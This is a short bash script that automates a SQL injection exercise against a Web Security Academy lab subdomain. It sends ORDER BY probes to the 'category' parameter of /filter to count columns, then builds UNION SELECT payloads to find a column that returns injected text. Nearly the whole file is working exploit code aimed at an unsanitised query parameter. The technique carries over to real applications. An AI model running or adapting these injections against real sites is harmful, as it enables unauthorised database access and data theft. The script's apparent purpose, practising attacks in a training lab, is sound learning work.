#!/bin/bash

#setup
if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain stringToInject"
	exit 1;
fi
url="https://$1.web-security-academy.net"

# Injection method - category is improperly sanetized
inject() {
	curl \
			-s \
			-G "$url/filter" \
			--data-urlencode "category=Gifts$1"
}

# Find number of columns
columnCount=1;
until \
	inject "' ORDER BY $((columnCount + 1))--" |
		grep '^Internal Server Error$' > /dev/null;
do
		columnCount=$((columnCount+1));
done;

echo "Finding a column containing text, injecting '$2'...";
testCol=1;
while test $testCol -le $columnCount; do
	buildCol=1;
	echo -e "\tTesting column $testCol";
	injection=$(
		echo -n "' UNION SELECT ";
		while test $buildCol -le $columnCount; do
			if test $buildCol -eq $testCol; then
				echo -n "'$2'";
			else
				echo -n "null";
			fi;
			if test $buildCol -ne $columnCount; then
				echo -n ", ";
			fi;
			let buildCol=$buildCol+1;
		done;
		echo "--";
	);
	if inject "$injection" | grep -v 'Internal Server Error' > /dev/null; then
		echo "Injected: $injection";
		break;
	fi;
	let testCol=$testCol+1;
done;

